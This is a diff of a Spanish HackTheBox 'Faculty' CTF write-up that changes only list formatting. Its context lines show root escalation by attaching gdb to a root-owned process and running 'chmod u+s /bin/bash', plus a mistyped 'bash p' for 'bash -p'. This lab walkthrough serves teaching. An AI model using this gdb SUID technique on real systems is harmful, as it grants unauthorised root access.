@@ -269,11 +269,11 @@ En este caso podríamos usar gdb.
 
 Aprovechándonos de un proceso que se ejecute como root podríamos usar gdb para asignar permisos suid a la bash y así convertirme en root.
 
-1. Identificamos un proceso que se ejecute como root
+* Identificamos un proceso que se ejecute como root
 
 ![](/assets/images/HTB/Faculty-HackTheBox/ps.webp)
 
-2. Con gdb asignamos suid a la bash aprovechando el proceso.
+* Con gdb asignamos suid a la bash aprovechando el proceso.
 
 ```bash
 gdb -p 735
@@ -282,7 +282,7 @@ call (void)system("chmod u+s /bin/bash")
 quit
 ```
 
-3. Una vez hemos asigando suid a la bash ejecutamos `bash p` y ya seremos root y podremos leer la flag root.txt
+* Una vez hemos asigando suid a la bash ejecutamos `bash p` y ya seremos root y podremos leer la flag root.txt
 
 ![](/assets/images/HTB/Faculty-HackTheBox/root.webp)
 
